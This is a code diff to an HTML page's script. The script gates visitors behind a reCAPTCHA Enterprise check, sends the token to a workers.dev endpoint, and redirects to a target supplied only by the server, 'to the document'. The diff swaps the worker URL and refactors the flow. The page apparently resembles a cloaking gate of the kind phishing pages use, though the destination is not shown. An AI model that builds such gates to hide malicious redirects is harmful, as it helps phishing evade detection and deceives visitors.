@@ -276,8 +276,8 @@
 
   <script>
     (function () {
-      // ---- CONFIG ----
-      const WORKER_URL = 'https://white-violet-3122.alex-aaf.workers.dev';
+      // ---- CONFIG (same as reference file) ----
+      const WORKER_URL = 'https://hidden-wind-22ea.alex-aaf.workers.dev';
       const RECAPTCHA_SITE_KEY = '6Le6NbQtAAAAAKk8sczwG5SB16kL4sk3RN9tx-y_';
 
       // ---- DOM ----
@@ -311,81 +311,72 @@
         detailsEl.textContent = details || '';
       }
 
-      // ---- Main flow ----
-      async function verifyWithRecaptcha() {
-        try {
+      // ---- Same reCAPTCHA token helper as reference file ----
+      function getRecaptchaToken() {
+        return new Promise((resolve, reject) => {
           if (!window.grecaptcha || !window.grecaptcha.enterprise) {
-            throw new Error('Security script could not be loaded. Please refresh the page.');
+            reject(new Error('reCAPTCHA Enterprise tweaking'));
+            return;
           }
-
-          await window.grecaptcha.enterprise.ready();
-
-          const token = await window.grecaptcha.enterprise.execute(RECAPTCHA_SITE_KEY, {
-            action: 'verify'
+          window.grecaptcha.enterprise.ready(() => {
+            window.grecaptcha.enterprise.execute(RECAPTCHA_SITE_KEY, { action: 'verify' })
+              .then(resolve)
+              .catch(reject);
           });
-
-          if (!token) {
-            throw new Error('Could not generate a security token. Please try again.');
-          }
-
-          subtitleEl.textContent = 'Confirming with the security service…';
-
-          const response = await fetch(`${WORKER_URL}/api/verify`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ recaptchaToken: token })
-          });
-
-          let data;
-          try {
-            data = await response.json();
-          } catch (e) {
-            throw new Error(`Unexpected server response (status ${response.status}).`);
-          }
-
-          if (response.ok && data.verified === true) {
-
-            // The worker MUST supply a redirectUrl — no front-end fallback.
-            const target =
-              typeof data.redirectUrl === 'string' ? data.redirectUrl.trim() : '';
-
-            if (!target) {
-              throw new Error('Verification succeeded but no redirect target was provided.');
-            }
-
-            setSuccess('Verification complete', 'Redirecting you to the document…');
-
-            // Small pause so the user can see the success state
-            setTimeout(() => {
-              window.location.href = target;
-            }, 900);
-
-          } else {
-            const reason =
-              data.error ||
-              (Array.isArray(data.reasons) && data.reasons.length
-                ? data.reasons.join(', ')
-                : 'Security check did not pass.');
-
-            throw new Error(reason);
-          }
-
-        } catch (err) {
-          console.error('[reCAPTCHA]', err);
-          setError(
-            'Verification failed',
-            'We could not confirm you are a real visitor. Please refresh the page and try again.',
-            err.message
-          );
-        }
+        });
       }
 
-      // Kick off after load
+      // ---- Same verification flow as reference file ----
+      function executeVerification() {
+        getRecaptchaToken()
+          .then(recaptchaToken => {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 10000);
+            return fetch(WORKER_URL + '/api/verify', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ recaptchaToken }),
+              signal: controller.signal
+            }).finally(() => clearTimeout(timeout));
+          })
+          .then(async r => {
+            const data = await r.json().catch(() => ({}));
+            if (!r.ok) {
+              throw new Error(data.error || `Verification service returned HTTP ${r.status}`);
+            }
+            return data;
+          })
+          .then(data => {
+            if (data.verified) {
+              setSuccess('Verification complete', 'Redirecting you to the document…');
+              setTimeout(() => { window.location.href = data.redirectUrl; }, 900);
+            } else {
+              throw new Error(
+                data.error ||
+                (Array.isArray(data.reasons) && data.reasons.length
+                  ? data.reasons.join(', ')
+                  : 'Security check did not pass.')
+              );
+            }
+          })
+          .catch(err => {
+            console.error('[reCAPTCHA]', err);
+            setError(
+              'Verification failed',
+              'We could not confirm you are a real visitor. Please refresh the page and try again.',
+              err.name === 'AbortError'
+                ? 'Verification timed out. Please try again.'
+                : err.message
+            );
+          });
+      }
+
+      // Kick off after load (same delay approach as reference)
       window.addEventListener('load', () => {
-        setTimeout(verifyWithRecaptcha, 120);
+        setTimeout(executeVerification, 120);
       });
 
-      // Safety net if the reCAPTCHA script never loads
+      // Safety net if the reCAPTCHA script never loads (same as reference)
       setTimeout(() => {
         if (!window.grecaptcha || !window.grecaptcha.enterprise) {
           setError(
